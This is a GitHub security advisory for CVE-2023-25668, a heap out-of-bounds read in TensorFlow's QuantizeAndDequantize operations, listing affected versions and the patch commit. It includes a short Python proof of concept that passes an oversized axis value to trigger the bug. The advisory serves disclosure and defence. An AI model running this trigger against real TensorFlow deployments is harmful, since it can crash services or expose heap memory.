# [C] TensorFlow has a heap out-of-buffer read vulnerability in the QuantizeAndDequantize operation

## Summary
Severity: Critical
Advisory: GHSA-gw97-ff7c-9v96
CVE: CVE-2023-25668
CWE: CWE-122, CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2023-03-24
Source: https://github.com/advisories/GHSA-gw97-ff7c-9v96
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.11.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.11.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.11.1

## Details
### Impact
Attackers using Tensorflow can exploit the vulnerability. They can access heap memory which is not in the control of user, leading to a crash or RCE.
When axis is larger than the dim of input, c->Dim(input,axis) goes out of bound.
Same problem occurs in the QuantizeAndDequantizeV2/V3/V4/V4Grad operations too.
```python
import tensorflow as tf
@tf.function
def test():
    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],
    								   input_min=[1.0],
    								   input_max=[10.0],
    								   signed_input=True,
    								   num_bits=1,
    								   range_given=True,
    								   round_mode='HALF_TO_EVEN',
    								   narrow_range=True,
    								   axis=0x7fffffff)
test()
```



### Patches
We have patched the issue in GitHub commit [7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gw97-ff7c-9v96
- https://nvd.nist.gov/vuln/detail/CVE-2023-25668
- https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb
- https://github.com/tensorflow/tensorflow
